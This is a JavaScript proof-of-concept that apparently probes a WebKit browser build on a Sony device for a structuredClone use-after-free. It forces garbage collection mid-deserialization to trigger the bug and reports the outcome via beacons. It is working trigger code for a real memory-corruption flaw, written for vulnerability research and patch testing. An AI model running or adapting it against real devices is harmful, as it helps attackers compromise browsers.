// c038: structuredClone CachedString UAF (fix 442482ad), live in Sony's drop.
//
// SerializedScriptValue.cpp's CloneDeserializer::CachedString stores a raw JSValue m_jsString with no write
// barrier and never appends it to a keep-alive buffer. Anything that forces GC between deserializing a repeated
// string and using it collects the JSString, and the value read back is garbage.
//
// Upstream's own regression test asserts the value survives; on a build without the fix it comes back wrong.
// The reporter here distinguishes three outcomes: value preserved (fixed), value wrong (bug present, no crash),
// or process death (bug present and severe).
(function () {
  function send(s) { try { navigator.sendBeacon('/beacon', 'c038-' + String(s)); } catch (e) {} }
  send('boot');

  var string = 'Expected result';
  var map = new Map();
  map.set('free', string);
  map.set('tmp', {
    get a() {
      map.delete('free');
      map.set('free', 0x1234);
      for (var i = 0; i < 0x10; i++) map.set('gc1_' + i, new ArrayBuffer(1024 * 1024 * 0x10));
      for (var j = 0; j < 0x2000; j++) map.set('gc2_' + j, new Date());
      map.set('expected', string);
      return 1;
    }
  });

  send('before-clone');
  var result;
  try { result = structuredClone(map); }
  catch (e) { send('clone-threw:' + e.name); return; }
  send('after-clone');

  var got, kind;
  try {
    got = result.get('expected');
    kind = (typeof got) + (got === string ? '/same-string' : '/other');
    if (got === 'Expected result') send('VERDICT-fixed-or-safe');
    else send('VERDICT-value-lost got=' + String(got).slice(0, 40) + ' kind=' + kind);
  } catch (e) { send('read-threw:' + e.name); }
  send('done');
})();
